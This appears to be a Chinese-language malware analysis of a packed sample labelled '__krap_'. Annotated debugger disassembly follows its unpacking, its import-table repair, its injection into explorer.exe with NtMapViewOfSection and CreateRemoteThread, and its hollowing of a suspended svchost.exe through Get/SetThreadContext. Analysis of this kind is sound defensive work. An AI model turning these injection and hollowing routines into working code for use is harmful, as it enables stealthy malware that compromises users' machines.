`00920A52` `E8 59FCFFFF` `call <get_export_table_address>` `// 查找对应的 Kernel32，ntdll 导出表`  

`00920A57` `8945 EC` `mov dword ptr ss:[ebp-14],eax`  

`00920A5A` `837D EC 00` `cmp dword ptr ss:[ebp-14],0`  

`00920A5E` `75 07` `jnz short 00920A67`  

`00920A60` `33C0` `xor eax,eax`  

`00920A62` `E9 17020000` `jmp 00920C7E`  

`00920A67` `8B55 EC` `mov edx,dword ptr ss:[ebp-14]`  

`00920A6A` `837A 20 00` `cmp dword ptr ds:[edx+20],0`  

`00920A6E` `75 07` `jnz short 00920A77`  

`00920A70` `33C0` `xor eax,eax`  

`// 找到了需要的 API`  

`00920C44` `837D E8 00` `cmp dword ptr ss:[ebp-18],0`  

`00920C48` `74 05` `je short 00920C4F`  

`00920C4A` `8B45 E8` `mov eax,dword ptr ss:[ebp-18]`  

`00920C4D` `EB 2F` `jmp short 00920C7E`  

`00920C4F` `EB 26` `jmp short 00920C77`  

`// 用自己获得的 API 填充自己已经被修改过的 IAT`  

`00920DA2` `E8 99FCFFFF` `call 00920A40` `// 找 (WININET.InternetOpenA) ok`  

`00920DA7` `8B4D E4` `mov ecx,dword ptr ss:[ebp-1C]` `; __krap_.00409100`  

`00920DAA` `8901` `mov dword ptr ds:[ecx],eax`  

`00920DAC` `8B55 E4` `mov edx,dword ptr ss:[ebp-1C]`  

`00920DAF` `833A 00` `cmp dword ptr ds:[edx],0`  

`// 清除工作`  

`00922351` `E8 EA020000` `call 00922640`  

`00922356` `8BE5` `mov esp,ebp`  

`00922358` `5D` `pop ebp`  

`00922359` `C2 1800` `retn 18`  

`009226A3` `8B7D 1C` `mov edi,dword ptr ss:[ebp+1C]`  

`009226A6` `8B75 18` `mov esi,dword ptr ss:[ebp+18]`  

`009226A9` `8B5D 14` `mov ebx,dword ptr ss:[ebp+14]`  

`009226AC` `FF65 F0` `jmp dword ptr ss:[ebp-10]` `// 注意这里，跳向了新的 EOP 处（00407f30）`  

`// 至此二次解密的前期准备工作完毕，下面是解密`  

`// 用 407000 数据按一定的格式去改写 401000 开始的数据`  

`00407F48` `8A06` `mov al,byte ptr ds:[esi]`  

`00407F4A` `46` `inc esi`  

`00407F4B` `8807` `mov byte ptr ds:[edi],al`  

`00407F4D` `47` `inc edi`  

`00407F4E` `01DB` `add ebx,ebx`  

`00407F50` `75 07` `jnz short __krap_.00407F59`  

`00407F52` `8B1E` `mov ebx,dword ptr ds:[esi]`  

`00407F54` `83EE FC` `sub esi,-4`  

`00407F57` `11DB` `adc ebx,ebx`  

`00407F59` `^ 72 ED` `jb short __krap_.00407F48`  

`...`  

`// 从 406000 开始,搜索导入表中函数名称的后面的信息。406420 开始为一块重定位的信息，利用这个重定位信息去修正 401000 中的代码,这里面记录的是要重定位数据的索引。`  

`004063E2` `41 00 01 48 74 74 70 51 75 65 72 79 49 6E 66 6F` `A.HttpQueryInfo`  

`004063F2` `41 00 01 49 6E 74 65 72 6E 65 74 43 6C 6F 73 65` `A.InternetClose`  

`00406402` `48 61 6E 64 6C 65 00 01 49 6E 74 65 72 6E 65 74` `Handle.Internet`  

`00406412` `52 65 61 64 46 69 6C 65 00 00 00 00 00 00 9D 08` `ReadFile......?`  

`00406422` `0F 11 1D 23 0F 0D 06 05 0D 06 15 33 0F 0E 0D 0B` `#..3.`  

`00406432` `07 12 07 27 35 21 A3 0B 34 70 0D 06 28 20 14 11` `'5!?4p.( `  

`00406442` `11 21 28 32 3B 39 09 1D 0B 0C 54 07 16 06 07 07` `!(2;9..T`  

`00406452` `07 07 07 07 13 09 12 06 05 0E 0F 10 0C 30 09 11` `..0.`  

`00406462` `19 15 15 14 26 15 15 14 19 15 15 14 19 15 15 14` `&`  

`00406472` `19 15 15 14 19 15 15 14 19 15 15 14 19 15 15 14`  

`00406482` `19 15 15 14 19 15 15 14 17 10 1B 10 1B 15 15 14`  

`00406492` `10 09 1D 0B 0C 17 0D 2D 2D 0D 27 52 24 18 14 0F` `...--.'R$`  

`//`  

`00408084` `31C0` `xor eax,eax`  

`00408086` `8A07` `mov al,byte ptr ds:[edi]` `// edi -> 00406424`  

`00408088` `47` `inc edi`  

`00408089` `09C0` `or eax,eax`  



### 反汇编代码片段

```
0040808B    74 22           je short __krap_.004080AF

0040808D    3C EF           cmp al,0EF

0040808F    77 11           ja short __krap_.004080A2

00408091    01C3           add ebx,eax                //  ebx - > 004010C1

00408093    8B03           mov eax,dword ptr ds:[ebx]

00408095    86C4           xchg ah,al

00408097    C1C0 10        rol eax,10

0040809A    86C4           xchg ah,al

0040809C    01F0           add eax,esi

0040809E    8903           mov dword ptr ds:[ebx],eax   // 去修正 4010c1 这块偏移

004080A0  ^ EB E2          jmp short __krap_.00408084

//例如下面代码代码

004010B5    C785 6CFFFFFF 9>mov dword ptr ss:[ebp-94],94

004010BF    FF15 000020B8   call dword ptr ds:[B8200000]

//会被修正为

004010B5    C785 6CFFFFFF 9>mov dword ptr ss:[ebp-94],94

004010BF    FF15 B8304000   call dword ptr ds:[4030B8]       ; kernel32.GetVersionExA
```

// 解密完成后对比变化

// 解密前

```
00401000 >55 8B EC 50 56 83 65 FC 00 C7 45 F8 00 00 00 00   UPV??...

00401010  56 C7 45 F4 FF FF FF FF EB 0A 5E 8B 75 F8 2B 75   V??^?u

00401020  F4 89 75 F8 8B 7D F8 3B 7D 10 73 65 8B 4D 0C 03   u}?}se.

00401030  4D F8 89 C8 8B 4D F4 31 D2 33 10 F7 D1 F7 D2 09   MM??餮饕.

00401040  D1 F7 D1 81 E1 FF 00 00 00 8B 45 14 03 45 FC 8B   痒?...E

00401050  10 89 D0 68 FF 00 00 00 23 04 24 83 C4 04 6A FF   h...#$j

00401060  33 04 24 40 83 C4 04 01 C1 8B 45 08 03 45 F8 C6   3$@EE

00401070  00 00 28 08 F6 18 8B 4D FC 41 89 4D FC 83 7D FC   ..(?}
```

// 解密后

```
00401000 >55 8B EC 81 EC DC 02 00 00 B8 6C 01 00 00 89 85   U?....

00401010  90 FE FF FF 89 85 24 FD FF FF 6A 00 8D 45 FC 50   $?j.

00401020  6A 01 E8 37 11 00 00 85 C0 74 04 33 C0 C9 C3 8B   j?..t3 郎

00401030  45 FC 8B 08 6A 08 6A 00 50 FF 51 50 8B 45 FC 8B   Ejj.PQP

00401040  08 8D 95 24 FD FF FF 52 8D 95 90 FE FF FF 52 50   $?RRP

00401050  FF 51 2C 85 C0 75 D4 81 BD CC FE FF FF 00 00 00   Q,u 教?...

00401060  02 1B C0 F7 D8 C9 C3 55 8B EC 83 EC 08 C6 45 FF   厉厣

00401070  00 0F 01 4D F9 8B 45 FB 25 00 00 F0 FF 3D 00 00   .ME?..?=..

00401080  C0 FF 75 04 C6 45 FF 01 0F B6 45 FF C9 C3 55 8B   ?u 擅 U
```

### 3 自身注入 Explorer.exe

// 接着获得版本信息及自身路径

```
00401FBB    55              push ebp                       ************

00401FBC    8BEC           mov ebp,esp

00401FBE    81EC 3C010000   sub esp,13C

00401FC4    8D85 C4FEFFFF   lea eax,dword ptr ss:[ebp-13C]

00401FCA    8945 FC         mov dword ptr ss:[ebp-4],eax

00401FCD    E8 BCF0FFFF     call __krap_.0040108E

00401FD2    84C0           test al,al

00401FD4  - 0F84 7E010000   je __krap_.00402158
```

// 截取自己所在路径下最后的文件名称，判断自身是不是 `explorer.exe`，因为这段代码会  
// 运行在病毒程序中，也会运行在被注入的 `explorer` 中。  
// 如果是 `explorer`,则注入代码到 `svchost.exe` 中。

```
00402010    8B4D FC         mov ecx,dword ptr ss:[ebp-4]

00402013    8B11           mov edx,dword ptr ds:[ecx]

00402015    B8 20202020     mov eax,20202020

0040201A    0BD0           or edx,eax

0040201C    81FA 6578706L   cmp edx,6C707865                        ; expl

00402022    75 77          jnz short __krap_.0040209B

00402024    8B51 04        mov edx,dword ptr ds:[ecx+4]

00402027    0BD0           or edx,eax

00402029    81FA 6F726572   cmp edx,7265726F                        ; orer

0040202F    75 6A          jnz short __krap_.0040209B

00402031    8B49 08        mov ecx,dword ptr ds:[ecx+8]

00402034    0BC8           or ecx,eax

00402036    81F9 2E657865   cmp ecx,6578652E                        ; .exe

0040203C    75 5D          jnz short __krap_.0040209B

0040203E    8B45 0C        mov eax,dword ptr ss:[ebp+C]

00402041    48             dec eax

00402042    75 4E          jnz short __krap_.00402092

00402044    6A 08          push 8

00402046    59             pop ecx

00402047    8D7D C8        lea edi,dword ptr ss:[ebp-38]

0040204A    F3:AB          rep stos dword ptr es:[edi]

0040204C    68 40344000    push __krap_.00403440                    ; ASCII "explorer.exe"

00402051    8D45 C8        lea eax,dword ptr ss:[ebp-38]

00402054    50             push eax

00402055    FF15 1C304000   call dword ptr ds:[40301C]              ; kernel32.lstrcpyA

0040205B    8D45 C8        lea eax,dword ptr ss:[ebp-38]

0040205E    50             push eax

0040205F    E8 7CF1FFFF    call __krap_.004011E0                   ; 获得 explorer.exe 进程 id

00402064    3BC3           cmp eax,ebx

00402066    59             pop ecx

00402067    74 29          je short __krap_.00402092

00402069    50             push eax

0040206A    53             push ebx

0040206B    68 FF0F1F00    push 1F0FFF

00402070    FF15 34304000   call dword ptr ds:[403034]              ; kernel32.OpenProcess

00402076    8BF0           mov esi,eax

00402078    3BF3           cmp esi,ebx

0040207A    74 16          je short __krap_.00402092

0040207C    53             push ebx

0040207D    56             push esi

0040207E    68 F11E4000    push <__krap_.inject_code>

00402083    E8 AEFCFFFF    call __krap_.00401D36                   // 注入代码到 svchost.exe
```

// 不是 `explorer.exe`,说明是病毒程序自身，提权，注入。

```
0040209B    57             push edi

0040209C    68 08404000    push __krap_.00404008

004020A1    53             push ebx

004020A2    FFD6           call esi

004020A4    FF15 A8304000   call dword ptr ds:[4030A8]              ; kernel32.GetCurrentProcess

004020AA    8D4D 0C        lea ecx,dword ptr ss:[ebp+C]

004020AD    51             push ecx

004020AE    6A 20          push 20

004020B0    50             push eax

004020B1    FF15 08304000   call dword ptr ds:[403008]              ; ADVAPI32.OpenProcessToken

004020B7    85C0           test eax,eax

004020B9    8B35 2C304000   mov esi,dword ptr ds:[40302C]           ; kernel32.CloseHandle

004020BF    74 44          je short __krap_.00402105

004020C1    8D45 F8        lea eax,dword ptr ss:[ebp-8]

004020C4    50             push eax

004020C5    68 FC334000    push __krap_.004033FC                   ; ASCII "SeDebugPrivilege"

004020CA    53             push ebx

004020CB    FF15 00304000   call dword ptr ds:[403000]              ; ADVAPI32.LookupPrivilegeValueA

004020D1    85C0           test eax,eax

004020D3    74 30          je short __krap_.00402105

004020D5    8B45 F8        mov eax,dword ptr ss:[ebp-8]

004020D8    53             push ebx

004020D9    8945 EC        mov dword ptr ss:[ebp-14],eax

004020DC    8B45 FC        mov eax,dword ptr ss:[ebp-4]

004020DF    53             push ebx

004020E0    53             push ebx

004020E1    8945 F0        mov dword ptr ss:[ebp-10],eax

004020E4    8D45 E8        lea eax,dword ptr ss:[ebp-18]

004020E7    50             push eax

004020E8    53             push ebx

004020E9    FF75 0C        push dword ptr ss:[ebp+C]

004020EC    C745 E8 0100000>mov dword ptr ss:[ebp-18],1

004020F3    C745 F4 0200000>mov dword ptr ss:[ebp-C],2

004020FA    FF15 04304000   call dword ptr ds:[403004]              ; ADVAPI32.AdjustTokenPrivileges
```

// 以下是查找过程，枚举进程，然后枚举模块，判断是否是 `explorer.exe`

```
00401213    E8 580F0000    call __krap_.00402170                    ; jmp to PSAPI.EnumProcesses

00401218    85C0           test eax,eax
```



```
    0040121A    0F84 07010000   je __krap_.00401327  

    00401220    8365 FC 00      and dword ptr ss:[ebp-4],0  

    00401224    F745 F8 FCFFFFF>test dword ptr ss:[ebp-8],FFFFFFFC  

    0040122B    0F86 F6000000   jbe __krap_.00401327  

    00401231    56             push esi  

    00401232    8B35 38304000   mov esi,dword ptr ds:[403038]            ; kernel32.lstrlenA  

    00401238    53             push ebx  

    00401239    8B45 FC        mov eax,dword ptr ss:[ebp-4]  

    0040123C    8B8485 F0EDFFFF mov eax,dword ptr ss:[ebp+eax*4-1210]  

    00401243    85C0           test eax,eax  

    00401245    0F84 BC000000   je __krap_.00401307  

    0040124B    50             push eax  

    0040124C    6A 00          push 0  

    0040124E    68 10040000     push 410  

    00401253    FF15 34304000   call dword ptr ds:[403034]               ; kernel32.OpenProcess  

    00401259    57             push edi  

    0040125A    8BD8           mov ebx,eax  

    0040125C    8D85 F0FEFFFF  lea eax,dword ptr ss:[ebp-110]  

    00401262    6A 00          push 0  

    00401264    50             push eax  

    00401265    E8 3D0A0000     call __krap_.00401CA7                   ; 清 0，存储模块名字的空间  

    0040126A    83C4 0C        add esp,0C  

    0040126D    85DB           test ebx,ebx  

    0040126F    0F84 8B000000   je __krap_.00401300  

    00401275    8D45 F0        lea eax,dword ptr ss:[ebp-10]           

    00401278    50             push eax  

    00401279    6A 04          push 4  

    0040127B    8D45 F4        lea eax,dword ptr ss:[ebp-C]  

    0040127E    50             push eax  

    0040127F    53             push ebx  

    00401280    E8 E50E0000     call __krap_.0040216A                   //枚举进程中的模块  

    00401285    85C0           test eax,eax  

    00401287    74 77          je short __krap_.00401300  

    00401289    57             push edi  

    0040128A    8D85 F0FEFFFF  lea eax,dword ptr ss:[ebp-110]  

    00401290    50             push eax  

    00401291    FF75 F4        push dword ptr ss:[ebp-C]  

    00401294    53             push ebx  

    00401295    E8 CA0E0000     call __krap_.00402164                   // GetModuleFileNameExA  

    0040129A    8D85 F0FEFFFF  lea eax,dword ptr ss:[ebp-110]  

    004012A0    50             push eax  

    004012A1    FFD6           call esi                                 // 计算获得模块路径的的长度  

    004012A3    85C0           test eax,eax  

    004012A5    74 59          je short __krap_.00401300  

    004012A7    80BD F1FEFFFF 3>cmp byte ptr ss:[ebp-10F],3A           // 查找任何的盘符 + ":\\" 开头的路径  

    004012AE    75 50          jnz short __krap_.00401300  

    004012B0    80BD F2FEFFFF 5>cmp byte ptr ss:[ebp-10E],5C  

    004012B7    75 47          jnz short __krap_.00401300  

    004012B9    FF75 08        push dword ptr ss:[ebp+8]               // 压入 explorer.exe  

    004012BC    FFD6           call esi                                 // 计算长度                         

    004012BE    85C0           test eax,eax  

    004012C0    7E 3E          jle short __krap_.00401300  

    004012C2    8D85 F0FEFFFF  lea eax,dword ptr ss:[ebp-110]  

    004012C8    50             push eax  

    004012C9    FFD6           call esi  

    004012CB    EB 12          jmp short __krap_.004012DF               // 反向查找 '\\' ，截取文件名和 explorer 进行比较  

    004012CD    8A11           mov dl,byte ptr ds:[ecx]  

    004012CF    80FA 40        cmp dl,40  

    004012D2    7E 0A          jle short __krap_.004012DE  

    004012D4    80FA 5B        cmp dl,5B  

    004012D7    7D 05          jge short __krap_.004012DE  

    004012D9    80C2 20        add dl,20  

    004012DC    8811           mov byte ptr ds:[ecx],dl  

    004012DE    48             dec eax  

    004012DF    8D8C05 F0FEFFFF lea ecx,dword ptr ss:[ebp+eax-110]  

    004012E6    8039 5C        cmp byte ptr ds:[ecx],5C  

    004012E9   ^ 75 E2         jnz short __krap_.004012CD  

    004012EB    FF75 08        push dword ptr ss:[ebp+8]  

    004012EE    8D8405 F1FEFFFF lea eax,dword ptr ss:[ebp+eax-10F]  

    004012F5    50             push eax  

    004012F6    FF15 30304000   call dword ptr ds:[403030]             ; lstrcmpA  

    004012FC    85C0           test eax,eax  

    004012FE    74 1B          je short __krap_.0040131B               // 如果枚举的进程 explorer.exe  

    00401300    53             push ebx  

    00401301    FF15 2C304000   call dword ptr ds:[40302C]             ; kernel32.CloseHandle  

    00401307    8B45 F8        mov eax,dword ptr ss:[ebp-8]  

    0040130A    FF45 FC        inc dword ptr ss:[ebp-4]  

    0040130D    C1E8 02        shr eax,2  

    00401310    3945 FC        cmp dword ptr ss:[ebp-4],eax  

    00401313  ^ 0F82 20FFFFFF   jb __krap_.00401239  

    00401319    EB 0A          jmp short __krap_.00401325  

    0040131B    8B45 FC        mov eax,dword ptr ss:[ebp-4]  

    0040131E    8B8485 F0EDFFFF mov eax,dword ptr ss:[ebp+eax*4-1210]    // 保留 explorer.exe 的进程 ID  

    00401325    5B             pop ebx  

    00401326    5E             pop esi  

    00401327    5F             pop edi  

    00401328    C9             leave  

    00401329    C3             retn  

    // 对 explorer.exe 的注入采用的 NtMapViewOfSection + CreateRemoteThread  

    00401D36        55             push ebp  

    00401D37        8BEC           mov ebp,esp  

    00401D39        81EC 0C030000   sub esp,30C  

    00401D3F        53             push ebx  

    00401D40        56             push esi  

    00401D41        57             push edi  

    00401D42        E8 B8FFFFFF     call __krap_.00401CFF  

    00401D47        25 0000FFFF     and eax,FFFF0000  

    00401D4C        8B78 3C         mov edi,dword ptr ds:[eax+3C]  

    00401D4F        03F8            add edi,eax  

    00401D51        8945 F8         mov dword ptr ss:[ebp-8],eax        

    00401D54        8D47 18         lea eax,dword ptr ds:[edi+18]  

    00401D57        8945 E0         mov dword ptr ss:[ebp-20],eax  

    00401D5A        8B40 38         mov eax,dword ptr ds:[eax+38]         //自身的 Size0fImage  

    00401D5D        33DB            xor ebx,ebx  

    00401D5F        6A 09           push 9                                 // 查看是否支持 PAE 扩展  

    00401D61        8945 F0         mov dword ptr ss:[ebp-10],eax  

    00401D64        885D FF         mov byte ptr ss:[ebp-1],bl  

    00401D67        FF15 98304000   call dword ptr ds:[403098]           //IsProcessorFeaturePresent  

    00401D6D        53             push ebx  

    00401D6E        FF75 F0         push dword ptr ss:[ebp-10]  

    00401D71        8BF0            mov esi,eax  

    00401D73        F7DE            neg esi  

    00401D75        1BF6            sbb esi,esi  

    00401D77        53             push ebx                                // hFile        = FFFFFFFF  

    00401D78        83E6 3C         and esi,3C                              // pSecurity    = NULL  

    00401D7B        83C6 04         add esi,4                               // Protection   = PAGE_EXECUTE_READWRITE  

    00401D7E        56             push esi                                // Max_SizeHigh = 0  

    00401D7F        53             push ebx                                // Max_SizeLow  = A000 -> 自身 Size0fImage 大小  

    00401D80        6A FF          push -1                                 // MapName      = Null  

    00401D82        FF15 94304000   call dword ptr ds:[403094]           // call kernel32.CreateFileMappingA  

    00401D88        3BC3            cmp eax,ebx  

    00401D8A        8945 E8         mov dword ptr ss:[ebp-18],eax  
```



```
00401D8D        75 07           jnz short __krap_.00401D96  

00401D8F        32C0            xor al,al  

00401D91        E9 56010000     jmp __krap_.00401EEC  

00401D96        53              push ebx  

00401D97        53              push ebx  

00401D98        53              push ebx  

00401D99        6A 02           push 2  

00401D9B        50              push eax  

00401D9C        FF15 90304000   call dword ptr ds:[403090]               ; call  MapViewOfFile  

00401DA2        3BC3            cmp eax,ebx  

00401DA4        8945 F4         mov dword ptr ss:[ebp-C],eax  

00401DA7        0F84 33010000   je __krap_.00401EE0  

00401DAD        68 1C344000     push __krap_.0040341C                   ; ASCII "NtMapViewOfSection"  

00401DB2        8D45 C0         lea eax,dword ptr ss:[ebp-40]  

00401DB5        50              push eax  

00401DB6        FF15 1C304000   call dword ptr ds:[40301C]               ; kernel32.lstrcpyA  

00401DBC        68 10344000     push __krap_.00403410                   ; ASCII "ntdll.dll"  

00401DC1        FF15 6C304000   call dword ptr ds:[40306C]               ; kernel32.LoadLibraryA  

00401DC7        8D4D C0         lea ecx,dword ptr ss:[ebp-40]  

00401DCA        51              push ecx  

00401DCB        50              push eax  

00401DCC        FF15 7C304000   call dword ptr ds:[40307C]               ; kernel32.GetProcAddress  

00401DD2        8B4D F0         mov ecx,dword ptr ss:[ebp-10]           // 从 ntdll 中 导出 zwMapViewOfSection  

00401DD5        56              push esi  

00401DD6        53              push ebx  

00401DD7        6A 01           push 1  

00401DD9        894D E4         mov dword ptr ss:[ebp-1C],ecx  

00401DDC        8D4D E4         lea ecx,dword ptr ss:[ebp-1C]  

00401DDF        51              push ecx  

00401DE0        53              push ebx  

00401DE1        53              push ebx  

00401DE2        53              push ebx  

00401DE3        8D4D EC         lea ecx,dword ptr ss:[ebp-14]  

00401DE6        51              push ecx  

00401DE7        FF75 0C         push dword ptr ss:[ebp+C]  

00401DEA        895D EC         mov dword ptr ss:[ebp-14],ebx  

00401DED        FF75 E8         push dword ptr ss:[ebp-18]  

00401DF0        FFD0            call eax                                 // 映射一段 0xA000 大小的空间  

00401DF2        FF75 F0         push dword ptr ss:[ebp-10]  

00401DF5        FF75 F8         push dword ptr ss:[ebp-8]  

00401DF8        FF75 F4         push dword ptr ss:[ebp-C]  

00401DFB        E8 DAFEFFFF     call __krap_.00401CDA                   // 拷贝自身数据到 Mapping 的空间中  

00401E00        0FB747 14       movzx eax,word ptr ds:[edi+14]          // SizeOfOptionalHeader = E0   

00401E04        0345 E0         add eax,dword ptr ss:[ebp-20]           // 定位到第一个节表  

00401E07        8B75 EC         mov esi,dword ptr ss:[ebp-14]  

00401E0A        8B48 34         mov ecx,dword ptr ds:[eax+34]           // 得到 VirtualAddress  

00401E0D        8BFE            mov edi,esi  

00401E0F        2B7D F8         sub edi,dword ptr ss:[ebp-8]            // edi = dif（地址差值） == NtMapViewOfSection 映射的地址 -  MapViewOfFile 映射地址  

00401E12        83C4 0C         add esp,0C  

00401E15        034D F8         add ecx,dword ptr ss:[ebp-8]  

00401E18        66:8139 8DBE    cmp word ptr ds:[ecx],0BE8D             // 查找节中一段特征指令 lea edi,dword ptr ds:[esi+5000] 

00401E1D        75 09           jnz short __krap_.00401E28               //                          mov eax,dword ptr ds:[edi]  

00401E1F        8179 06 8B0709C>cmp dword ptr ds:[ecx+6],C009078B       //                          or eax,eax                           

00401E26        74 03           je short __krap_.00401E2B  

00401E28        41              inc ecx  

00401E29      ^ EB ED           jmp short __krap_.00401E18  

00401E2B        8B49 02         mov ecx,dword ptr ds:[ecx+2]            // 取出上面指令中的 0x5000 这个数字到 ecx  

00401E2E        8B40 0C         mov eax,dword ptr ds:[eax+C]            // 定位第一个节的虚拟地址，0x1000  

00401E31        03C8            add ecx,eax                            

00401E33        034D F8         add ecx,dword ptr ss:[ebp-8]            // 刚好得到第一个节的 0x406000 位置  

00401E36        EB 0D           jmp short __krap_.00401E45  

00401E38        83C1 08         add ecx,8  

00401E3B        EB 01           jmp short __krap_.00401E3E  

00401E3D        41              inc ecx  

00401E3E        66:3919         cmp word ptr ds:[ecx],bx                // 0x406000 的位置是导入表函数名区域，不断比较是否 00 00  

00401E41      ^ 75 FA           jnz short __krap_.00401E3D               // 好跳过该区域，该区域是一个索引，里面记录了偏移，用于  

00401E43        41              inc ecx                                 // 后面的重定位，设 x_table[0 ~ n] 表示该区域内对应的索引  

00401E44        41              inc ecx                                 // 0xf0 是索引区域结束的标志  

00401E45        3919            cmp dword ptr ds:[ecx],ebx  

00401E47      ^ 75 EF           jnz short __krap_.00401E38  

00401E49        8B55 F4         mov edx,dword ptr ss:[ebp-C]  

00401E4C        83C1 04         add ecx,4  

00401E4F        8D5410 FC       lea edx,dword ptr ds:[eax+edx-4]  

00401E53        8A01            mov al,byte ptr ds:[ecx]  

00401E55        41              inc ecx  

00401E56        3AC3            cmp al,bl  

00401E58        74 26           je short __krap_.00401E80  

00401E5A        3C F0           cmp al,0F0  

00401E5C        73 07           jnb short __krap_.00401E65  

00401E5E        0FB6C0          movzx eax,al                             // mem_view_off = 映射区域第一个节代码的开始位置  

00401E61        03D0            add edx,eax                              // mem_view_off = x_table[n] + mem_view_off 

00401E63        EB 0F           jmp short __krap_.00401E74             

00401E65        0FB731          movzx esi,word ptr ds:[ecx]  

00401E68        83E0 0F         and eax,0F  

00401E6B        C1E0 10         shl eax,10  

00401E6E        0BC6            or eax,esi  

00401E70        03D0            add edx,eax  

00401E72        41              inc ecx  

00401E73        41              inc ecx  

00401E74        013A            add dword ptr ds:[edx],edi             // 对 mem_view_off 重定位改写，每次通过  

00401E76        8A01            mov al,byte ptr ds:[ecx]               // dif（地址差值）来修正 

00401E78        41              inc ecx                                

00401E79        3AC3            cmp al,bl  

00401E7B      ^ 75 DD           jnz short __krap_.00401E5A             // 例如：  

00401E7D        8B75 EC         mov esi,dword ptr ss:[ebp-14]           // 要注入代码的地址计算 = 映射地址（BE0000） - 自身 ImageBase(400000) + 自身代码地址（401EF1）  

00401E80        2B75 F8         sub esi,dword ptr ss:[ebp-8]            // 最终要注入代码的地址 = 00FE1EF1  

00401E83        0375 08         add esi,dword ptr ss:[ebp+8]  

00401E86        395D 10         cmp dword ptr ss:[ebp+10],ebx  

00401E89        75 18           jnz short __krap_.00401EA3  

00401E8B        53              push ebx                                 // 注入 00401EF1 <__krap_.inject_code> 地址代码到 explorer 中  

00401E8C        53              push ebx  

00401E8D        53              push ebx  

00401E8E        56              push esi  

00401E8F        53              push ebx  

00401E90        53              push ebx  

00401E91        FF75 0C         push dword ptr ss:[ebp+C]
```



### 00401E94 - 00401EF0

```
00401E94        FF15 8C304000   call dword ptr ds:[40308C]                ; kernel32.CreateRemoteThread
00401E9A        50              push eax
00401E9B        FF15 2C304000   call dword ptr ds:[40302C]                ; kernel32.CloseHandle
00401EA1        EB 30           jmp short __krap_.00401ED3
00401EA3        8D85 F4FCFFFF   lea eax,dword ptr ss:[ebp-30C]
00401EA9        50              push eax
00401EAA        FF75 10         push dword ptr ss:[ebp+10]
00401EAD        C785 F4FCFFFF   mov dword ptr ss:[ebp-30C],10002          // 这段代码是在 explorer.exe 注入 svchost.exe 中要走的流程，后面会有分析。
00401EB7        FF15 88304000   call dword ptr ds:[403088]                // kernel32.GetThreadContext
00401EBD        8D85 F4FCFFFF   lea eax,dword ptr ss:[ebp-30C]            // 取 CONTEXT 结构首地址
00401EC3        50              push eax                                    // 压入 CONTEXT 结构首地址
00401EC4        FF75 10         push dword ptr ss:[ebp+10]                // 压入 hThread
00401EC7        89B5 A4FDFFFF   mov dword ptr ss:[ebp-25C],esi            // 修改 CONTEXT.Eip = 新的注入代码地址
00401ECD        FF15 84304000   call dword ptr ds:[403084]                // call  SetThreadContext
00401ED3        FF75 F4         push dword ptr ss:[ebp-C]
00401ED6        C645 FF 01      mov byte ptr ss:[ebp-1],1
00401EDA        FF15 80304000   call dword ptr ds:[403080]                ; kernel32.UnmapViewOfFile
00401EE0        FF75 E8         push dword ptr ss:[ebp-18]
00401EE3        FF15 2C304000   call dword ptr ds:[40302C]                ; kernel32.CloseHandle
00401EE9        8A45 FF         mov al,byte ptr ss:[ebp-1]
00401EEC        5F              pop edi
00401EED        5E              pop esi
00401EEE        5B              pop ebx
00401EEF        C9              leave
00401EF0        C3              retn
```

### 4. .Explorer 在再注入 Svchost.exe

```
// 注入到 explorer.exe 中代码
00E21EF1    55              push ebp
00E21EF2    8BEC            mov ebp,esp
00E21EF4    81EC 4C010000   sub esp,14C
00E21EFA    56              push esi
00E21EFB    68 D0070000     push 7D0
00E21F00    FF15 7030E200   call dword ptr ds:[E23070]                   ;  Sleep 休眠 2 秒
00E21F06    33F6            xor esi,esi
00E21F08    8D45 FC         lea eax,dword ptr ss:[ebp-4]
00E21F0B    50              push eax
00E21F0C    56              push esi
00E21F0D    56              push esi
00E21F0E    68 031DE200     push 0E21D03
00E21F13    56              push esi
00E21F14    56              push esi
00E21F15    8975 FC         mov dword ptr ss:[ebp-4],esi                 // 创建一个线程不停的去删除主运行程序文件,很简单不分析了。
00E21F18    FF15 B430E200   call dword ptr ds:[E230B4]                   //call  CreateThread
00E21F1E    50              push eax
00E21F1F    FF15 2C30E200   call dword ptr ds:[E2302C]                   ; kernel32.CloseHandle
// 注入 svchost，这里使用了 CREATE_SUSPENDED CreateProcess + ResumeThread 方式注入
// 相当于启动一个傀儡的进程 svchost.exe,
00E21F25    68 04010000     push 104
00E21F2A    8D85 B4FEFFFF   lea eax,dword ptr ss:[ebp-14C]
00E21F30    50              push eax
00E21F31    FF15 A030E200   call dword ptr ds:[E230A0]                   ; kernel32.GetSystemDirectoryA
00E21F37    68 3034E200     push 0E23430                                  ; ASCII "\svchost.exe"
00E21F3C    8D85 B4FEFFFF   lea eax,dword ptr ss:[ebp-14C]
00E21F42    50              push eax
00E21F43    FF15 1830E200   call dword ptr ds:[E23018]                   ; kernel32.lstrcatA
00E21F49    6A 40           push 40                                       // svchost.exe 所在的系统目录
00E21F4B    8D45 BC         lea eax,dword ptr ss:[ebp-44]
00E21F4E    56              push esi
00E21F4F    50              push eax
00E21F50    C745 B8 4400000>mov dword ptr ss:[ebp-48],44
00E21F57    E8 4BFDFFFF     call 00E21CA7                                 // 分配 0x40 个空间，初始化为 0，就是 STARTUPINFO 结构
00E21F5C    83C4 0C         add esp,0C
00E21F5F    68 0C41E200     push 0E2410C
00E21F64    8D45 B8         lea eax,dword ptr ss:[ebp-48]
00E21F67    50              push eax
00E21F68    56              push esi
00E21F69    56              push esi
00E21F6A    6A 04           push 4
00E21F6C    56              push esi
00E21F6D    56              push esi
00E21F6E    56              push esi
00E21F6F    8D85 B4FEFFFF   lea eax,dword ptr ss:[ebp-14C]
00E21F75    50              push eax
00E21F76    56              push esi
00E21F77    C745 E4 0100000>mov dword ptr ss:[ebp-1C],1
00E21F7E    66:C745 E8 0500 mov word ptr ss:[ebp-18],5                   // 调试方式创建一个傀儡进程 svchost.exe 进程，并挂起。
00E21F84    FF15 4030E200   call dword ptr ds:[E23040]                   // call kernel32.CreateProcessA
00E21F8A    FF35 1041E200   push dword ptr ds:[E24110]
00E21F90    FF35 0C41E200   push dword ptr ds:[E2410C]                   // 再次注入代码到 svchost.exe 进程
00E21F96    68 C415E200     push 0E215C4                                  // 注入 GetThreadContext()  ，SetThreadContext() 注入
// 这里为 svchost.exe 重新映射一块内存，然后修正 Context.eax 值，使其执行要注入代码的首地址
00E21F9B    E8 96FDFFFF     call 00E21D36
00E21FA0    83C4 0C         add esp,0C
00E21FA3    84C0            test al,al
00E21FA5    74 0C           je short 00E21FB3
00E21FA7    FF35 1041E200   push dword ptr ds:[E24110]
